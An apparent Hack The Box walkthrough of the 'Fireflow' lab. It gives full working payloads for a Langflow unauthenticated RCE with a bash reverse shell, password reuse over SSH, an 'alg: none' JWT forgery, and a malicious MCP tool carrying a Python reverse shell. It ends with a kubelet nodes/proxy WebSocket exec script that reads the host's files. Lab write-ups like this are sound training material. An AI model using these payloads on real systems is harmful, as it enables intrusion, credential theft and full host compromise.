# 🔥 Fireflow — HTB Full Walkthrough

<p align="center">
  <img src="https://img.shields.io/badge/Machine-Fireflow-red?style=for-the-badge&logo=hackthebox"/>
  <img src="https://img.shields.io/badge/OS-Linux-yellow?style=for-the-badge&logo=linux"/>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/CVE-2026--33017-critical?style=for-the-badge"/>
</p>

<p align="center">
  <i>A Langflow RCE chain through Kubernetes nodes/proxy privilege escalation to host root.</i><br>
  <strong>Tags:</strong> <code>linux</code> <code>langflow</code> <code>rce</code> <code>jwt</code> <code>kubernetes</code>
</p>

---

## 📋 Table of Contents

- [🔍 Reconnaissance](#-reconnaissance)
- [🌐 Langflow Discovery](#-langflow-discovery)
- [💥 CVE-2026-33017 — Unauthenticated RCE](#-cve-2026-33017--unauthenticated-rce)
- [🔑 Credential Harvesting & SSH Pivot](#-credential-harvesting--ssh-pivot)
- [🎯 MCP Server Enumeration](#-mcp-server-enumeration)
- [🛡️ JWT Algorithm Confusion — Admin Token Forge](#️-jwt-algorithm-confusion--admin-token-forge)
- [🐚 Malicious MCP Tool → Pod Shell](#-malicious-mcp-tool--pod-shell)
- [☸️ Kubernetes nodes/proxy Escalation](#️-kubernetes-nodesproxy-escalation)
- [👑 The Root Flag](#-the-root-flag)
- [📊 Attack Chain Summary](#-attack-chain-summary)

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -p- 10.129.244.214 -oN recon.nmap
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu
443/tcp open  https    nginx
```

Only **SSH** and **HTTPS** — a minimal surface. Let's probe the web server.

```bash
curl -sk https://10.129.244.214
```

```
301 Moved Permanently → https://fireflow.htb/
```

Add the hostname:

```bash
echo "10.129.244.214  fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts
```

---

## 🌐 Langflow Discovery

Browsing to `https://fireflow.htb` reveals the **FireFlow — Task Force Nightfall** landing page:

![Landing Page](https://img.shields.io/badge/screenshot-landing_page-8A2BE2?style=flat)

The page links to an **"Open Agent →"** button pointing to a subdomain:

```
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

This is a **Langflow** instance — an open-source low-code LLM agent builder.

![Langflow Playground](https://img.shields.io/badge/screenshot-langflow_playground-8A2BE2?style=flat)

```bash
curl -sk https://flow.fireflow.htb/api/v1/config
```

```json
{"max_file_size_upload":1024,"event_delivery":"streaming","voice_mode_available":false,"type":"public"}
```

```bash
curl -sk https://flow.fireflow.htb/api/v1/version
```

```json
{"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
```

**Langflow 1.8.2** — let's check for CVEs.

---

## 💥 CVE-2026-33017 — Unauthenticated RCE

| Field | Value |
|-------|-------|
| **CVE** | CVE-2026-33017 |
| **CVSS** | 9.8 (Critical) |
| **Affected** | Langflow < 1.9.0 |
| **Endpoint** | `POST /api/v1/build_public_tmp/{flow_id}/flow` |
| **Root Cause** | Attacker-supplied `data` param with Python code → `exec()` with zero sandboxing |

The `build_public_tmp` endpoint accepts an optional `data` parameter containing a complete flow definition (nodes + edges). Instead of loading the stored flow from the database, it passes this user-controlled data directly to `start_flow_build` → `create_graph` → `eval_custom_component_code` → **`exec()`**.

We supply a `CustomComponent` with Python code that runs before the Component class definition:

```python
import os
_x = os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.9/7787 0>&1'")

from lfx.custom.custom_component.component import Component
from lfx.io import Output
from lfx.schema.data import Data

class ExploitComp(Component):
    display_name="X"
    outputs=[Output(display_name="O",name="o",method="r")]
    def r(self)->Data:
        return Data(data={})
```

### Sending the Exploit

Start a listener:

```bash
nohup socat TCP-LISTEN:7787,reuseaddr,fork EXEC:bash,pty,stderr &
```

Fire the payload:

```bash
curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  -d '{
    "data": {
      "nodes": [{
        "id": "X",
        "type": "genericNode",
        "data": {
          "id": "X",
          "type": "X",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "multiline": true,
                "value": "import os\n_x = os.system(\"bash -c '\''bash -i >& /dev/tcp/10.10.16.9/7787 0>&1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})\n"
              }
            }
          }
        }
      }],
      "edges": []
    }
  }'
```

![Reverse Shell Caught](https://img.shields.io/badge/screenshot-www_data_shell-8A2BE2?style=flat)

```bash
www-data@fireflow:/var/lib/langflow$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🔑 Credential Harvesting & SSH Pivot

From the www-data shell, the `.env` file is a goldmine:

```bash
cat /etc/langflow/.env
```

```
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_LOG_LEVEL=warning
LANGFLOW_NEW_USER_IS_ACTIVE=False
```

The password `n1ghtm4r3_b4_n1ghtf4ll` hints at the system user `nightfall`. Password reuse pays off:

```bash
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh nightfall@fireflow.htb
```

```
nightfall@fireflow:~$ id
uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
```

```bash
nightfall@fireflow:~$ cat /home/nightfall/user.txt
921b8f387f4c5328706f0c6b434a517b
```

| 🏴 **User Flag** | `921b8f387f4c5328706f0c6b434a517b` |
|:-|:-|

---

## 🎯 MCP Server Enumeration

Inside nightfall's home, a hidden directory reveals the next stage:

```bash
cat /home/nightfall/.mcp/config.json
```

```json
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

Port 30080 is only accessible from localhost. Query via SSH:

```bash
curl http://127.0.0.1:30080/api/v1/version
```

```json
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "supported_algorithms": ["HS256", "none"]
  },
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
```

![MCP API](https://img.shields.io/badge/screenshot-mcp_version-8A2BE2?style=flat)

The server directly advertises `"alg": "none"` — a classic unsigned JWT attack vector.

---

## 🛡️ JWT Algorithm Confusion — Admin Token Forge

Because the server accepts `alg: "none"`, we can forge a token with **zero lines of crypto**:

```python
import base64, json

header  = base64.urlsafe_b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).rstrip(b"=").decode()

payload = base64.urlsafe_b64encode(
    json.dumps({"sub":"admin","role":"admin"}).encode()
).rstrip(b"=").decode()

token = f"{header}.{payload}."
print(token)
```

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

> The signature is literally **empty** — just a trailing dot. The server doesn't care.

Verify admin access:

```bash
curl -s http://127.0.0.1:30080/api/v1/tools \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
```

```json
[
  {"name":"ping_host","description":"Ping a target host 3 times..."},
  {"name":"get_metrics_summary","description":"Return system memory summary..."},
  {"name":"list_running_tasks","description":"List top 20 processes..."}
]
```

We have full admin control over the MCP tool registry.

---

## 🐚 Malicious MCP Tool → Pod Shell

The `POST /api/v1/tools` endpoint accepts a `code` field containing arbitrary Python. This code executes server-side when the tool is invoked via JSON-RPC.

Key insight: the registration handler runs in a short-lived HTTP context. `os.system()` would die when the response is sent. We use **`subprocess.Popen`** to detach the reverse shell process:

```bash
ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."

# Register
curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name": "r9",
    "description": "x",
    "inputSchema": {"type":"object","properties":{}},
    "code": "import subprocess,os;subprocess.Popen([\"python3\",\"-c\",\"import socket,subprocess,os,pty;s=socket.socket();s.settimeout(20);s.connect((\\\"10.10.16.9\\\",7792));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\\"/bin/bash\\\")\"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)"
  }'

# Invoke via JSON-RPC
curl -s -X POST http://127.0.0.1:30080/mcp \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"r9","arguments":{}}}'
```

![MCP Pod Shell](https://img.shields.io/badge/screenshot-mcp_pod-8A2BE2?style=flat)

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ id
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
mcp@mcp-server-54464cb475-29ztf:/app$ hostname
mcp-server-54464cb475-29ztf
```

We're inside a **Kubernetes pod** in a k3s cluster. The service account token is at the standard path:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://10.43.0.1:443"
```

---

## ☸️ Kubernetes nodes/proxy Escalation

### RBAC Recon

The first thing to do inside any pod — what can this service account do?

```bash
curl -sk -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

```json
{
  "resourceRules": [
    {
      "verbs": ["get"],
      "apiGroups": [""],
      "resources": ["nodes/proxy"]
    }
  ]
}
```

![RBAC Check](https://img.shields.io/badge/screenshot-rbac-8A2BE2?style=flat)

`nodes/proxy` is a powerful but subtle permission. It allows proxying HTTP requests **through the API server** to the kubelet on any node. The kubelet's `/exec` endpoint can execute commands in any pod — **no further RBAC required**.

### Enumerating Privileged Pods

```bash
curl -sk "https://10.129.244.214:10250/pods" \
  -H "Authorization: Bearer $TOKEN" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for i in d.get('items',[]):
    priv=False
    for v in i.get('spec',{}).get('volumes',[]):
        if v.get('hostPath',{}).get('path')=='/': priv=True
    for c in i.get('spec',{}).get('containers',[]):
        if c.get('securityContext',{}).get('privileged'): priv=True
    if priv:
        print(i['metadata']['namespace']+'/'+i['metadata']['name'])
"
```

```
monitoring/prometheus-prometheus-node-exporter-nmntq
```

This pod has:
- **`privileged: true`**
- **Host root filesystem mounted at `/host/root`**
- **Container name:** `node-exporter`

---

## 👑 The Root Flag

The kubelet's exec API uses WebSocket protocol `v4.channel.k8s.io`. We implement a raw WebSocket client in Python using only standard library modules:

```python
import socket, ssl

TOKEN = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
HOST = "10.129.244.214"

s = socket.socket()
s.settimeout(15)
s.connect((HOST, 10250))

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ss = ctx.wrap_socket(s, server_hostname=HOST)

path = "/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter"
path += "?command=cat&command=/host/root/root/root.txt&output=1&error=1"

CR, LF = chr(13), chr(10)
up =  f"GET {path} HTTP/1.1{CR}{LF}"
up += f"Host: {HOST}:10250{CR}{LF}"
up += f"Authorization: Bearer {TOKEN}{CR}{LF}"
up += f"Upgrade: websocket{CR}{LF}"
up += f"Connection: Upgrade{CR}{LF}"
up += f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=={CR}{LF}"
up += f"Sec-WebSocket-Protocol: v4.channel.k8s.io{CR}{LF}"
up += f"Sec-WebSocket-Version: 13{CR}{LF}"
up += f"{CR}{LF}"

ss.send(up.encode())

resp = b""
while b"\r\n\r\n" not in resp:
    resp += ss.recv(4096)

result = b""
while True:
    try:
        d = ss.recv(8192)
        if not d: break
        if len(d) > 1: result += d  # Strip channel byte
    except:
        break

ss.close()
print(f"ROOT FLAG: {result.decode(errors='replace').strip()}")
```

![WebSocket Exec](https://img.shields.io/badge/screenshot-websocket_exec-8A2BE2?style=flat)

```
ROOT FLAG: 502b3df3de9a73547744af0e4072f122
```

| 👑 **Root Flag** | `502b3df3de9a73547744af0e4072f122` |
|:-|:-|

---

## 📊 Attack Chain Summary

```mermaid
graph TD
    A[nmap: 22/443] --> B[fireflow.htb]
    B --> C[Langflow 1.8.2 @ flow.fireflow.htb]
    C --> D[CVE-2026-33017: build_public_tmp RCE]
    D --> E[www-data shell]
    E --> F[/etc/langflow/.env]
    F --> G[Password: n1ghtm4r3_b4_n1ghtf4ll]
    G --> H[SSH as nightfall]
    H --> I[user.txt]
    H --> J[.mcp/config.json]
    J --> K[MCP Server 127.0.0.1:30080]
    K --> L[JWT alg: none → Admin token]
    L --> M[Register malicious tool]
    M --> N[MCP pod shell]
    N --> O[nodes/proxy RBAC]
    O --> P[Kubelet WebSocket exec]
    P --> Q[Privileged node-exporter pod]
    Q --> R[/host/root/root/root.txt]
    R --> S[root flag]
```

### Full Kill Chain

```
fireflow.htb (443)
    │
    ├── CVE-2026-33017 (Langflow build_public_tmp RCE)
    │       │
    │       └── www-data shell
    │               │
    │               ├── /etc/langflow/.env → Password: n1ghtm4r3_b4_n1ghtf4ll
    │               │
    │               ├── SSH as nightfall → ⚑ user.txt
    │               │
    │               └── .mcp/config.json → MCP Server on 127.0.0.1:30080
    │                       │
    │                       ├── JWT alg: "none" → Forged admin token
    │                       │
    │                       └── Malicious tool registration → Pod shell
    │                               │
    │                               └── nodes/proxy permission
    │                                       │
    │                                       └── Kubelet WebSocket exec on node-exporter
    │                                               │
    │                                               └── /host/root/root/root.txt → ⚑ root.txt
    └──
```

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| ![nmap](https://img.shields.io/badge/-nmap-blue) | Port scanning |
| ![curl](https://img.shields.io/badge/-curl-green) | API exploitation |
| ![socat](https://img.shields.io/badge/-socat-orange) | Reverse shell listeners |
| ![Python](https://img.shields.io/badge/-Python-yellow) | JWT forge, WebSocket exec |
| ![sshpass](https://img.shields.io/badge/-sshpass-lightgrey) | Credential reuse |
| ![k3s](https://img.shields.io/badge/-k3s-9cf) | Kubernetes enumeration |

---

<p align="center">
  <b>Fireflow — Fully Compromised</b><br>
  <sub>User: 921b8f387f4c5328706f0c6b434a517b | Root: 502b3df3de9a73547744af0e4072f122</sub>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Status-Owned-brightgreen?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/HTB-Medium-orange?style=for-the-badge"/>
</p>
